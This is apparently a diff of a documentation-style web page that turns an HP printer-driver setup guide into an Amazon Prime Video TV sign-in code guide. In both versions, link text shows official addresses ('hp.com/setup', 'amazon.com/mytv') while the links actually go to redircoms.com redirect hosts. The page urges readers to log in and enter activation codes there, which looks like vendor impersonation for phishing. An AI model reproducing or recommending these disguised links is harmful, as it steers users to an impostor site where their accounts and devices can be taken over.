@@ -1,21 +1,21 @@
 ##################
-How Do I Download, Install, and Set Up My HP Printer Driver?
+Where do I get Amazon tv sign in code?
 ##################
 
 .. meta::
-   :msvalidate.01: 108BF3BCC1EC90CA1EBEFF8001FAEFEA
+   :msvalidate.01: 51D86F3827D403B2FE6D81FEFE6D97FC
 
 .. image:: blank.png
       :width: 350px
       :align: center
       :height: 100px
 
-.. image:: Enter_Product_Key.png
+.. image:: get-started.png
       :width: 350px
       :align: center
       :height: 100px
-      :alt: hp.com/setup
-      :target: https://hp.redircoms.com
+      :alt: amazon.com/mytv
+      :target: https://az.redircoms.com
 
 .. image:: blank.png
       :width: 350px
@@ -28,46 +28,36 @@ How Do I Download, Install, and Set Up My HP Printer Driver?
 
 
 
-There are 5 simple stages to download, install, and set up your HP printer driver on your computer. Follow each stage one by one to successfully connect your printer via `hp.com/setup <https://hp.redircoms.com>`_. HP’s setup site provides the latest drivers and simple installation steps. It’s the fastest way to ensure your printer works seamlessly with your computer. Visit `hp.com/setup <https://hp.redircoms.com>`_, download the right driver, and get your printer ready to use in minutes.
+To sign in to your Amazon account on a smart TV or streaming device, you'll need a special sign-in code. This code is displayed when you open the Prime Video app on your device. To activate your device, visit `amazon.com/mytv <https://az.redircoms.com>`_, where you can enter the code and link your device to your Amazon account.
 
-**********
-Steps to Download HP Printer Driver
-**********
+How to Get the Amazon TV Sign In Code
+--------------------------------------
 
-1. Open a web browser and go to `hp.com/setup <https://hp.redircoms.com>`_.
+Follow these steps to find your Amazon TV sign-in code:
 
-2. Enter your HP printer model in the search box.
+1. **Turn on your smart TV or streaming device** (like Fire Stick, Roku, Apple TV, or gaming console).
+2. **Open the Amazon Prime Video app** on the device.
+3. Select **"Sign in and start watching"** or **"Register on the Amazon website"** (depending on your device).
+4. The screen will display a **six-character or eight-character code**.
+5. This is your **Amazon TV sign-in code**.
 
-3. Select your operating system if prompted.
+What to Do with the Code
+-------------------------
 
-4. Click on **Download** to get the latest driver and software package.
+Once you have the code, follow these steps:
 
-5. Save the installer file to your computer.
+1. On your computer, phone, or tablet, open a web browser.
+2. Go to `amazon.com/mytv <https://az.redircoms.com>`_.
+3. **Log in to your Amazon account** if you're not already signed in.
+4. Enter the code shown on your TV screen.
+5. Click **"Register"** or **"Submit"** to complete the activation process.
 
-**********
-Steps to Install HP Printer Driver
-**********
+Tips for Successful Activation
+------------------------------
 
-1. Locate the downloaded installer file on your computer.
+- Make sure your TV or device has a stable internet connection.
+- The code may expire after a few minutes—refresh the app if needed.
+- Double-check that you're entering the correct characters (O vs 0, I vs 1).
+- If activation fails, restart your device and try again.
 
-2. Double-click the installer to begin the setup process.
-
-3. Follow the on-screen instructions and accept the license agreement.
-
-4. Choose your connection type (USB or Wireless).
-
-5. Complete the installation by clicking **Finish**.
-
-**********
-Setting Up Your HP Printer
-**********
-
-1. Make sure your HP printer is powered on.
-
-2. For wireless setup, ensure your printer and computer are on the same Wi-Fi network.
-
-3. Open the HP driver or utility you installed.
-
-4. Follow on-screen prompts to detect and connect your printer.
-
-5. Once connected, print a test page to verify setup is complete.
+By retrieving your sign-in code from the Prime Video app and visiting `amazon.com/mytv <https://az.redircoms.com>`_, you can quickly and easily activate your device for streaming.
